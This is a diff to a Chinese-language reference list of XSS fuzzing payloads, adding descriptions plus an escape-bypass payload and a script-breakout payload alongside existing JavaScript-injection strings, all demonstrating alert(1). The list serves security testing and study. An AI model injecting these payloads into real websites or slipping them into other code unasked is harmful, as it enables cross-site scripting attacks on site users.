@@ -39,12 +39,22 @@ xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
 javascript:alert(1)
 ```
 **5.Javascript Injection (javascript注入)** <br>
-当输入的payload，被插入到javascript脚本块中的字符串内时使用。
+当输入的payload，被插入到javascript标签块中的字符串定界值中时使用。
 ```
 '-alert(1)-'
 '/alert(1)//
 ```
-**6.Javascript Injection - Escape Bypass (javascript注入-)**
+**6.Javascript Injection - Escape Bypass (javascript注入-绕过)** <br>
+当输入的payload，被插入到javascript标签块字符串定界值中，但具有单引号，可以尝试使用反斜杠注释进行绕过。
+```
+\'/alert(1)//
+```
+**7.Javascript Injection – Script Breakout (javascript注入-脚本突破)** <br>
+当输入的payload，被插入到javascript标签块中的任何位置时使用。
+```
+</script><svg onload=alert(1)>
+```
+
 ## 致谢
 **英文议题作者：** <br>
 @brutelogic <br>
